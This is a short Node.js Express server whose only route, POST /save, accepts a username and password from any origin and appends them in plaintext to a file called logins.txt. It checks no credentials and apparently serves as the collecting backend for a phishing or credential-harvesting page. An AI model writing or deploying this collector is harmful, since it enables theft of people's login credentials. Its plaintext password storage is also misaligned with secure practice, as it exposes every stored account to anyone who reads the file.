const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

app.use(express.json());
app.use(cors());

app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile("logins.txt", data, (err) => {
        if (err) {
            res.status(500).send("Error saving data.");
        } else {
            res.send("Login data saved.");
        }
    });
});

app.listen(3000, () => console.log("Server running on port 3000"));
